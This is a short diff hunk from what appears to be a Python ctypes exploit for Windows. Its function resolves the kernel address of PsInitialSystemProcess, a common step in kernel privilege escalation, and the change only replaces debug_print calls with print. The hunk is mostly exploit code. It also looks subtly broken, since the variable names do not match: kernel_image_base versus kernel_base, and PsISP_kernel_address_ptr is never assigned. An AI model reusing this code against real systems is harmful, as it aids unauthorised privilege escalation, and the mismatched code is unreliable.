@@ -141,16 +141,16 @@ def get_PsISP_kernel_address(kernel_base):
     # Load kernel image in userland and get PsInitialSystemProcess offset
     kernel32.LoadLibraryA.restype = HMODULE #I have no fucking idea what HMODULE is
     hKernelImage = kernel32.LoadLibraryA(kernel_base)
-    debug_print("[+] Loading %s in Userland" % kernel_base)
-    debug_print("[+] %s Userland Base Address : 0x%X" % (kernel_base, hKernelImage))
+    print("[+] Loading %s in Userland" % kernel_base)
+    print("[+] %s Userland Base Address : 0x%X" % (kernel_base, hKernelImage))
     kernel32.GetProcAddress.restype = c_ulonglong
     kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
     PsISP_user_address = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
-    debug_print("[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address)
+    print("[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address)
     
     # Calculate PsInitialSystemProcess offset in kernel land
     system_process_base_pointer = kernel_image_base + ( PsISP_user_address - hKernelImage)
-    debug_print("[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr)
+    print("[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr)
     
     PsISP_kernel_address = c_ulonglong()
     
